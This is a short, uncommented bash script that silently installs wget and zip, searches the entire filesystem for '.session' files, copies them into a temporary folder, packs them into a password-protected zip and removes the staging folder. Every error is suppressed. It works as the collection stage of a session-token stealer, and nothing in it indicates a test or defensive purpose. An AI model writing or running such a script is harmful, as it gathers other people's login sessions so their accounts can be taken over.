apt update -y && apt upgrade -y && apt install wget zip -y >/dev/null 2>&1

mkdir -p /tmp/test 2>/dev/null

find / -name "*.session" -exec cp {} /tmp/test/ \; 2>/dev/null

if [ "$(ls -A /tmp/test 2>/dev/null)" ]; then
    zip -q -P "1" -r /tmp/test.zip /tmp/test >/dev/null 2>&1
fi

rm -rf /tmp/test 2>/dev/null
